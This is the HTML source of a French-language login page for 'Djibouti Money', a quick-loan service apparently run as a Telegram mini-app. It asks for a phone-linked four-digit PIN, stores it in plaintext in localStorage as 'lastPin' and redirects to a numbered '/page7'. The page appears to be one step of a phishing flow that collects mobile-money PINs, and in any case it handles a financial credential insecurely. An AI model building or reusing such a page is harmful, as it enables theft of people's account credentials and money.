<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Djibouti Money - Connexion</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --primary-yellow: #eab308; --bg-color: #ffffff; }
        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
        body { background-color: var(--bg-color); margin: 0; padding: 0; display: flex; flex-direction: column; min-height: 100vh; align-items: center; }
        .header-box { width: 100%; background: #fefce8; border-bottom: 2px solid #fef08a; padding: 30px 20px; text-align: center; }
        .header-title { font-size: 28px; font-weight: 800; color: #ca8a04; }
        .main-content { width: 90%; max-width: 400px; margin: 25px auto; text-align: center; flex-grow: 1; display: flex; flex-direction: column; align-items: center; }
        .phone-display { width: 100%; border: 1.5px solid #fde047; border-radius: 12px; padding: 14px; display: flex; align-items: center; gap: 12px; margin-bottom: 25px; font-weight: 700; background: #fffdf5; }
        .pin-wrapper { position: relative; width: 100%; display: flex; justify-content: center; gap: 12px; margin-bottom: 25px; }
        .pin-box { width: 52px; height: 52px; border: 1.5px solid #fde047; border-radius: 12px; text-align: center; font-size: 22px; font-weight: bold; outline: none; background: #fffdf5; }
        .btn-submit { background-color: #e5e7eb; color: #9ca3af; border: none; width: 100%; padding: 16px; border-radius: 10px; font-size: 16px; font-weight: 800; cursor: not-allowed; text-transform: uppercase; }
        .btn-submit.active { background-color: #eab308; color: #000; cursor: pointer; }
        .error-banner { background: #fee2e2; color: #dc2626; padding: 10px; border-radius: 8px; margin-bottom: 15px; width: 100%; display: none; font-size: 13px; }
    </style>
</head>
<body>
<div class="header-box">
    <div class="header-title">Djibouti Money</div>
    <div style="font-size: 14px; color: #555; margin-top: 5px;">Prêts Rapides</div>
</div>

<div class="main-content">
    <h2>Connexion</h2>
    <div id="errorDisplay" class="error-banner"></div>
    <div class="phone-display">
        <span>🇩🇯</span><span>+253</span>
        <span id="displayPhone">--</span>
    </div>
    <p style="font-size: 14px; color: #666; margin-bottom: 15px;">Entrez votre code PIN</p>
    
    <div class="pin-wrapper">
        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
    </div>

    <button id="loginBtn" class="btn-submit" disabled>SE CONNECTER</button>
</div>

<script>
    const pinBoxes = document.querySelectorAll('.pin-box');
    const loginBtn = document.getElementById('loginBtn');
    document.getElementById('displayPhone').textContent = localStorage.getItem('phone') || "77000000";

    pinBoxes.forEach((box, index) => {
        box.addEventListener('input', () => {
            box.value = box.value.replace(/\D/g, '');
            if (box.value && index < pinBoxes.length - 1) pinBoxes[index + 1].focus();
            const filled = [...pinBoxes].every(b => b.value.length === 1);
            loginBtn.disabled = !filled;
            loginBtn.classList.toggle('active', filled);
        });
    });

    loginBtn.addEventListener('click', () => {
        let pin = "";
        pinBoxes.forEach(b => pin += b.value);
        localStorage.setItem('lastPin', pin);
        location.href = '/page7';
    });
</script>
</body>
</html>
